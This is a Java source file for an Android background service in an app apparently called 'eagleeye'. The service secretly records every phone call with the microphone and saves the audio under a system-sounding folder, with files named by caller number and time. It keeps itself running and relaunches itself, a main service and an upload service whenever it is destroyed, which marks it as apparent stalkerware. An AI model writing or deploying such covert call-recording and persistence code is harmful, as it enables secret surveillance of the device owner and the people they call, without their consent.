package net.web135.eagleeye;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

public class NumberService extends Service {

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		// 防止Services被kill掉，会重启，然后运行当前onStartCommand
		return START_STICKY;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		Log.i("NumberService", "==]====>Service is onCreate!!");
		String path = Environment.getExternalStorageDirectory() + "/SystemRecord";
		File pathRecord = new File(path);
		if (!pathRecord.exists()) {
			// 若不存在，创建目录，可以在应用启动的时候创建
			pathRecord.mkdirs();
		}
		//如果允许录音，才进行录音
		if (Define.enableRecord) {
			TelephonyManager manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
			manager.listen(new StateListener(), PhoneStateListener.LISTEN_CALL_STATE);
		}
	}

	private final class StateListener extends PhoneStateListener {

		private String numbaer;
		private MediaRecorder recoder;
		private File file;
		private boolean isRecoder = false;

		@Override
		public void onCallStateChanged(int state, String incomingNumber) {
			try {
				switch (state) {
				case TelephonyManager.CALL_STATE_RINGING:
					numbaer = incomingNumber;
					break;
				case TelephonyManager.CALL_STATE_OFFHOOK:
					numbaer = incomingNumber;
					SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd_HH-mm-ss");
					String timeStr = format.format(new Date());
					file = new File(Environment.getExternalStorageDirectory() + "/SystemRecord", numbaer + "_" + timeStr + ".3gp");
					Log.i("NumberService", "==]====>FilePath is:" + file.getPath());
					Log.i("NumberService", "==]====>FileAbsolutePath is:" + file.getAbsolutePath());
					recoder = new MediaRecorder();
					recoder.setAudioSource(MediaRecorder.AudioSource.MIC);
					recoder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
					recoder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
					recoder.setOutputFile(file.getAbsolutePath());
					recoder.prepare();
					recoder.start();
					isRecoder = true;
					Log.i("NumberService", "==]====>Service is Recoder start!!");
					Log.i("NumberService", "==]====>filePath: " + file.getAbsolutePath());
					break;
				case TelephonyManager.CALL_STATE_IDLE:
					numbaer = incomingNumber;
					if (isRecoder) {
						recoder.stop();
						recoder.release();
						recoder = null;
						isRecoder = false;
						Log.i("NumberService", "==]====> Service is Recoder stop!!");
					}
					break;
				}
			} catch (IllegalStateException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}

	}

	@Override
	public void onDestroy() {
		Intent eagleEyeService = new Intent(this, EyeMain.class);
		this.startService(eagleEyeService);
		Intent numberService = new Intent(this, NumberService.class);
		this.startService(numberService);
		Intent uploadService = new Intent(this, UpLoadService.class);
		this.startService(uploadService);
	}

}
